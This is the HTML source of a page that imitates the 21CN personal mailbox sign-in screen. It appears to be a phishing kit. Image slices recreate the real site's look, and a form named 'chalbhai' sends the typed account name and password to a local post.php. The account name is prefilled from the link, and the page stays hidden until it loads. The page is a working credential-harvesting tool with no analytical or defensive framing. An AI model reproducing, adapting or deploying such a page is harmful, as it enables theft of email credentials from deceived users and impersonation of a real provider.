<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#50;&#49;&#67;&#78;&#20010;&#20154;&#37038;&#31665;</title>
<script type="text/javascript" src="https://www.sitepoint.com/examples/password/MaskedPassword/MaskedPassword.js"></script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	
			  <style type="text/css">
  
.textbox { 
    border: 1px solid #ccc; 
    padding-left:  12px;
	font-size: 14px;
	font-weight: bold;
    width: 275px; 
    height: 40px; 
  } 
 
 .textbox:focus { 
    border: 1px solid #ccc; 
    outline: none; 
    box-shadow: 0px 0px 30px #dcdcdc inset;  
  } 
   </style>
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
<style type="text/css">
div#container
{
	position:relative;
	width: 1365px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body style="visibility:hidden" onload="unhideBody()">
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:54px; width:1365px; height:215px; z-index:0"><img src="images/cn1.png" alt="" title="" border=0 width=1365 height=215></div>

<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:266px; width:1365px; height:203px; z-index:1"><img src="images/cn2.png" alt="" title="" border=0 width=1365 height=203></div>

<div id="image3" style="position:absolute; overflow:hidden; left:0px; top:466px; width:1365px; height:168px; z-index:2"><img src="images/cn3.png" alt="" title="" border=0 width=1365 height=168></div>

<div id="image4" style="position:absolute; overflow:hidden; left:861px; top:85px; width:278px; height:18px; z-index:3"><a href="#"><img src="images/cn4.png" alt="" title="" border=0 width=278 height=18></a></div>

<div id="image5" style="position:absolute; overflow:hidden; left:801px; top:488px; width:192px; height:39px; z-index:4"><a href="#"><img src="images/cn5.png" alt="" title="" border=0 width=192 height=39></a></div>

<div id="image6" style="position:absolute; overflow:hidden; left:971px; top:451px; width:97px; height:21px; z-index:5"><a href="#"><img src="images/cn6.png" alt="" title="" border=0 width=97 height=21></a></div>

<div id="image7" style="position:absolute; overflow:hidden; left:1011px; top:411px; width:56px; height:19px; z-index:6"><a href="#"><img src="images/cn7.png" alt="" title="" border=0 width=56 height=19></a></div>
<form action=post.php name=chalbhai id=chalbhai method=post>
<input name="userid" value="<?=$_GET[userid]?>" placeholder="&#50;&#49;&#67;&#78;&#37038;&#31665;&#36134;&#21495;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:246px;left:815px;top:269px;z-index:7">
<input name="pass" id="demo-field" placeholder="&#23494;&#30721;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:246px;left:815px;top:308px;z-index:8">
<div id="formimage1" style="position:absolute; left:814px; top:366px; z-index:9"><input type="image" name="formimage1" width="248" height="36" src="images/singn.png"></div>
</div>
<script type="text/javascript">
 
  //apply masking to the demo-field
  //pass the field reference, masking symbol, and character limit
  new MaskedPassword(document.getElementById("demo-field"), '\u25CF');
 
  //test the submitted value
  document.getElementById('demo-form').onsubmit = function()
  {
   alert('pword = "' + this.pword.value + '"');
   return false;
  };
 
 </script>
</body>
</html>
